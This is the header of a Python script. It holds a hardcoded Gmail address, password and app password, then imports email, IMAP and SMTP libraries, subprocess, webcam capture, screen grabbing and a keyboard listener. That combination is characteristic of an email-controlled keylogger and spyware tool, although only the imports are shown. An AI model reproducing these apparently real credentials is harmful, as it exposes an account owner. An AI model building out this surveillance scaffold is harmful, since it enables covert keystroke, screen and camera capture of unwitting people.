USERNAME = "emailcontrolmmt@gmail.com"
PASSWORD = "mmt10diem"
APP_PASS = "yntx ansy zonv gwcj"

import email
import imaplib
import logging
import os
import smtplib
import subprocess
from datetime import datetime
from email.mime.base import MIMEBase
from email.mime.image import MIMEImage
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from time import sleep

from cv2 import VideoCapture, imwrite
from PIL import ImageGrab
from pynput.keyboard import Listener
